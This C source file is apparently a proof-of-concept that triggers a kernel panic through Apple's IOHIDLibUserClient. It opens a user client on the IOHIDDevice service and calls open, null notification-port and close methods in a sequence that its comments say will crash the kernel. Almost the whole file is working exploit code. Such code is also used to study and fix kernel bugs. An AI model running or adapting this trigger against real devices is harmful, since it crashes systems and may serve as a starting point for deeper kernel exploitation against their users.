//
//  poc.c
//  iohidlibuserclient_poc
//
//  Created by Raz Mashat on 31/03/2020.
//  Copyright © 2020 Raz Mashat. All rights reserved.
//

#include "poc.h"
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>

void poc ()
{
    //thx ian for the userclient creation code that i was too lazy to write myself
    kern_return_t kr;
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDDevice"));
    
    if (service == IO_OBJECT_NULL){
      printf("unable to find service\n");
      return;
    }
    mach_port_t conn = MACH_PORT_NULL;
    kr = IOServiceOpen(service, mach_task_self(),0, &conn);
    if (kr != KERN_SUCCESS){
      mach_error("openclient: ",kr);
      printf("unable to get user client connection (you probably aint jailbroken) \n");
      return;
    }
    printf("userclient: 0x%x\n",conn);
   uint64_t inputScalar[10];
   kr = IOConnectCallMethod(conn, 1, inputScalar, 1, NULL, 0, NULL, 0, NULL, 0);
    mach_error("open: ",kr);
    kr = IOConnectSetNotificationPort(conn, 1, MACH_PORT_NULL, 0);
    mach_error("notifiaction: ",kr);
     kr = IOConnectCallMethod(conn, 2, inputScalar, 0, NULL, 0, NULL, 0, NULL, 0);
    mach_error("close: ",kr);
    //if the close external method wont panic then this will
    IOServiceClose(conn);
}
